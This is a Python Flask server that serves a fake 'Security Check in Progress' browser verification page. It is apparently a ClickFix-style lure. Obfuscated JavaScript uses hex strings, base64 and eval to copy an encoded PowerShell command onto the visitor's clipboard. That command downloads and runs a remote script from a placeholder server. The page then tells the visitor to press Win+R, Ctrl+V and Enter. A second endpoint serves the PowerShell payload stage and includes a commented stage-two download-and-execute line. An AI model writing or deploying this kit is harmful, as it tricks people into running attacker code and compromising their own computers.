from flask import Flask, make_response
import base64

app = Flask(__name__)

# Heavily obfuscated JS payload - mix of string splitting, unicode noise, eval chains, dead code
obf_js = """
(function(){var _0xabc=['\\x70\\x6F\\x77\\x65\\x72\\x73\\x68\\x65\\x6C\\x6C\\x2E\\x65\\x78\\x65','\\x2D\\x4E\\x6F\\x50\\x72\\x6F\\x66\\x69\\x6C\\x65','\\x2D\\x45\\x78\\x65\\x63\\x75\\x74\\x69\\x6F\\x6E\\x50\\x6F\\x6C\\x69\\x63\\x79','\\x42\\x79\\x70\\x61\\x73\\x73','\\x2D\\x43\\x6F\\x6D\\x6D\\x61\\x6E\\x64','\\x49\\x45\\x58','\\x28\\x4E\\x65\\x77\\x2D\\x4F\\x62\\x6A\\x65\\x63\\x74\\x20\\x4E\\x65\\x74\\x2E\\x57\\x65\\x62\\x43\\x6C\\x69\\x65\\x6E\\x74\\x29\\x2E\\x44\\x6F\\x77\\x6E\\x6C\\x6F\\x61\\x64\\x53\\x74\\x72\\x69\\x6E\\x67\\x28\\x27https://yourserver/payload.ps1\\x27\\x29',''];function _0xdef(_0x1,_0x2){return _0xabc[_0x1-0x0];}var payload=atob('UABvAHcAZQByAFMAaABlAGwAbAAgAC0ATgBvAFAAcgBvAGYAaQBsAGUAIAAtAEUAbgBjACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACgAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHkAbwB1AHIAcwBlAHIAdgBlAHIALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApACAAfAAgAEkARQB4AA==');var trash='\\u200C\\u200D'+Math.random();eval('document.addEventListener(\\'DOMContentLoaded\\',function(){try{navigator.clipboard.writeText(payload);}catch(e){}var div=document.createElement(\\'div\\');div.style.cssText=\\'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;font-family:Consolas;z-index:999999;text-align:center;padding-top:20%;font-size:2em;\\';div.innerHTML=\\'<h1>VERIFICATION REQUIRED</h1><p>Press <b>Win + R</b> → <b>Ctrl + V</b> → <b>Enter</b><br/>to continue...<br/><small>(browser security step)</small></p>\\';document.body.appendChild(div);setTimeout(()=>{div.remove();window.location=\\'https://google.com\\';},8000);var s=document.createElement(\\'script\\');s.src=\\'data:text/javascript;base64,'+btoa('alert(\\'failed\\')')+'\\';document.head.appendChild(s);});');})();
"""

@app.route('/')
def index():
    html = f"""
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="refresh" content="8;url=https://google.com" />
        <title>Just a moment...</title>
        <style>body {{background:#111;color:#0f0;font-family:monospace;}}</style>
    </head>
    <body>
        <h1>Security Check in Progress...</h1>
        <p>Please wait while we verify your browser.</p>
        <script>
        {obf_js}
        </script>
    </body>
    </html>
    """
    resp = make_response(html)
    resp.headers['Content-Type'] = 'text/html'
    return resp

# Optional payload endpoint (example remote PS1 that does something naughty)
@app.route('/payload.ps1')
def payload():
    ps = """
    # Your real payload here - example opens calc as proof
    Start-Process calc.exe
    # or IEX (New-Object Net.WebClient).DownloadString('https://yourserver/stage2.ps1')
    """
    resp = make_response(ps)
    resp.headers['Content-Type'] = 'text/plain'
    return resp

@app.route('/<path:dummy>')
def catch_all(dummy):
    return index()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
